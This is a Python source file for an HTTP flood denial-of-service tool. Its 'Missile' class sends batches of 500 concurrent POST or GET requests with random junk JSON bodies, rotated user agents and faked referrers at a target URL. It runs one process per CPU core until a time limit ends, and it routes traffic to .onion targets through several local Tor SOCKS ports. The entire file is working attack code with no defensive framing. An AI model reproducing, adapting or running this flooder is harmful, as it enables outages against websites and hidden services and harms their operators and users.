import argparse
import asyncio
import contextlib
import logging
import os
import platform
import random
import re
import socket
import string
import sys
import threading
from typing import TYPE_CHECKING, List, Optional, Tuple
from urllib.parse import urljoin
from multiprocessing import Process, Manager
import aiohttp
from aiohttp_socks import ProxyConnector
import time

target_cores = list()

socksPort = ["socks5://127.0.0.1:9152", "socks5://127.0.0.1:9154", "socks5://127.0.0.1:9156",
             "socks5://127.0.0.1:9158", "socks5://127.0.0.1:9160", "socks5://127.0.0.1:9162",
             "socks5://127.0.0.1:9164", "socks5://127.0.0.1:9166", "socks5://127.0.0.1:9168",
             "socks5://127.0.0.1:9170"]
ControlPort = ["socks5://127.0.0.1:9153", "socks5://127.0.0.1:9155", "socks5://127.0.0.1:9157",
               "socks5://127.0.0.1:9159", "socks5://127.0.0.1:9161", "socks5://127.0.0.1:9163",
               "socks5://127.0.0.1:9165", "socks5://127.0.0.1:9167", "socks5://127.0.0.1:9169",
               "socks5://127.0.0.1:9171"]


class Missile:
    """
    The Missile class which will hammer the target with HTTP requests.

    :param com: The Comms class which is used to communicate with the server.
    :type com: :class:`Comms`
    :param target: The target URL to attack.
    :type target: str
    """

    def __init__(self, target: str):
        self.url = target
        self.host = urljoin(self.url, '/')
        if target.find(".onion") > -1:
            self.method = "get"
        else:
            self.method = "post"
        self.count = 0

    @staticmethod
    def generate_junk(size: int) -> str:
        """
        Generate random junk data.

        :param size: The size of the junk data.
        :type size: int
        :return: The random junk data.
        :rtype: str
        """
        return ''.join(
            random.choices(
                string.ascii_letters + string.digits,
                k=random.randint(3, size)
            )
        )

    async def _launch(self, session: aiohttp.ClientSession) -> int:
        """
        Launch a single HTTP request and return the response.

        :param session: The session to use for the request.
        :type session: :class:`aiohttp.ClientSession`
        :return: The response status code.
        :rtype: int
        """
        self.count += 1
        headers, payload = self._get_payload()
        try:
            async with session.request(
                    method=self.method,
                    url=self.url,
                    headers=headers,
                    json=payload
            ) as resp:
                status = resp.status
                reason = resp.reason
                if any([
                    resp.headers.get('server', '').lower() == "cloudflare",
                    status == 400
                ]):
                    if status:
                        print(status)
                else:
                    print(status)
            return status
        except aiohttp.ClientConnectorError:
            return 69

    def _get_payload(self) -> Tuple[dict, dict]:
        """
        Generate the payload for the HTTP request.

        :return: The headers and payload for the HTTP request.
        :rtype: Tuple[dict, dict]
        """
        ua_list = [
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)'
            'Gecko/20090913 Firefox/3.5.3',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3)'
            'Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)'
            'Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1)'
            'Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US)'
            'AppleWebKit/532.1 (KHTML, like Gecko)'
            'Chrome/4.0.219.6 Safari/532.1',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64;'
            'Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0;'
            'Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322;'
            '.NET CLR 3.5.30729; .NET CLR 3.0.30729)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2;'
            'Win64; x64; Trident/4.0)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0;'
            'SV1; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
            'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
            'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
        ]
        referrer_list = [
            'https://www.google.com/?q=',
            'https://www.usatoday.com/search/results?q=',
            'https://engadget.search.aol.com/search?q=',
            'https://cloudfare.com',
            'https://github.com',
            'https://en.wikipedia.org',
            'https://youtu.be',
            'https://mozilla.org',
            'https://microsoft.com',
            'https://wordpress.org',
            self.host
        ]
        headers = {
            'Cache-Control': 'no-cache',
            'Accept': 'text/html,application/xhtml+xml,application/xml;'
                      'q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Content-Encoding': 'deflate',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Keep-Alive': str(random.randint(110, 120)),
            'User-Agent': random.choice(ua_list),
            'Referer': random.choice(referrer_list),
        }
        payload = {
            self.generate_junk(
                random.randint(5, 10)
            ): self.generate_junk(
                random.randint(500, 1000)
            )
        }
        return headers, payload

    async def attack(self, count: int, proxy: str):
        global socksPort
        """
        Launch the attack.

        :param count: The number of requests to launch.
        :type count: int
        """
        if self.url.find(".onion") > -1:
            async with aiohttp.ClientSession(
                    connector=ProxyConnector.from_url(proxy, rdns=True),
            ) as session:
                tasks = [
                    asyncio.create_task(self._launch(session))
                    for _ in range(count)
                ]
                status_list = set(await asyncio.gather(*tasks))
        else:
            async with aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(limit=0),
            ) as session:
                tasks = [
                    asyncio.create_task(self._launch(session))
                    for _ in range(count)
                ]
                status_list = set(await asyncio.gather(*tasks))


async def launcher(target, proxy=""):
    if platform.system() == 'Windows':
        asyncio.set_event_loop_policy(
            asyncio.WindowsSelectorEventLoopPolicy()
        )
    missile = Missile(target)
    task = asyncio.create_task(
        missile.attack(500, proxy)
    )
    await task


def launcher_of_attack(target, proxy=""):
    asyncio.run(launcher(target, proxy))


def controller(x, target, tempo, timee):
    global target_cores
    try:
        if target.find(".onion") > -1:
            proc = Process(target=launcher_of_attack, args=(target, socksPort[x % len(socksPort)],))
            proc.start()
            target_cores.append(proc)
        else:
            proc = Process(target=launcher_of_attack, args=(target,))
            proc.start()
            target_cores.append(proc)
        proc.join()
    except Exception:
        pass
    time.sleep(1)
    if time.time() - tempo <= timee:
        controller(x, target, tempo, timee)


def stop():
    global target_cores
    print(2)
    [x.kill() for x in target_cores]
    print(4)


def main(target: str, timee: int):
    global socksPort
    tempo = time.time()
    print(0)
    for x in range(0, os.cpu_count()):
        proc = Process(target=controller, args=(x, target, tempo, timee))
        proc.start()
    print(1)
    while True:
        time.sleep(1)
        if time.time() - tempo > timee:
            stop()
            print(2)
            break
